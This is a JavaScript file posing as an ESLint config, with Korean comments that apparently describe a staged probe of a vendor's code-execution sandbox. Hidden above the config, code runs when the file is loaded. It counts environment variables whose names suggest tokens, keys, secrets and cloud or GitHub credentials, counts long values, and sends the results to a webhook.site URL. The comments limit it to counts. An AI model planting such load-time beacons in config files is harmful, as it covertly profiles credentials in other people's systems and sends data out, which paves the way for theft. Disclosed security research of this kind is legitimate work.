// s4d — 등급을 가르는 마지막 변수 하나.
//
// 지금까지: 저장소 JS 가 그들 샌드박스에서 실행되고(s4), 비-root·컨테이너이며(s4b),
// 외부 이그레스는 열렸고 내부 메타데이터는 막혔다(s4c).
// 이 상태로 공격자가 유출할 수 있는 것이 자기 저장소뿐이면 결함이 아니다.
// 그래서 묻는다: **그 실행 문맥에 자격증명이 있는가.**
//
// ── 스스로 그은 선 ────────────────────────────────────────────────────
//  * 환경변수의 **값을 읽지 않는다.** 전송하지 않는다.
//  * 환경변수의 **이름도 전송하지 않는다.**
//  * 보내는 것은 **패턴별 개수**와 값 길이의 합계뿐이다. 이것으로 "있다/없다"가 판정되고,
//    그 이상은 벤더가 직접 확인할 일이다.
//  * 파일시스템 탐색·다른 테넌트 탐색은 하지 않는다.
const M = 'CRMARK-06fef04be9dc';

function credShape() {
  const env = globalThis.process.env;
  const keys = Object.keys(env);
  const pats = {
    token: /TOKEN/i,
    key: /(^|_)KEY(_|$)|APIKEY|API_KEY/i,
    secret: /SECRET/i,
    password: /PASS(WORD)?/i,
    cred: /CRED/i,
    auth: /AUTH/i,
    github: /GITHUB|GH_/i,
    npm: /NPM_/i,
    aws: /AWS_/i,
    gcp: /GOOGLE|GCP_|GCLOUD/i,
  };
  const out = { total: keys.length };
  let suspicious = 0;
  for (const name of Object.keys(pats)) {
    const n = keys.filter((k) => pats[name].test(k)).length;
    out['n_' + name] = n;
    if (n > 0) suspicious += n;
  }
  // 값 자체는 보지 않되, "긴 값이 몇 개인가"는 자격증명 존재의 간접 지표다.
  out.long_values = keys.filter((k) => String(env[k] || '').length >= 32).length;
  out.suspicious_total = suspicious;
  return out;
}

(async () => {
  let q = '';
  try {
    const f = credShape();
    q = Object.keys(f).map((k) => k + '=' + encodeURIComponent(String(f[k]))).join('&');
  } catch (e) {
    q = 'err=' + encodeURIComponent(String(e).slice(0, 60));
  }
  try { await fetch('https://webhook.site/b237c48c-bf1b-481d-b0fa-8476674f885c/s4d-cred?m=' + M + '&' + q); } catch (e) { /* 무시 */ }
})().catch(() => {});

export default [
  { files: ['**/*.js', '**/*.mjs'], rules: { 'no-unused-vars': 'warn' } },
];
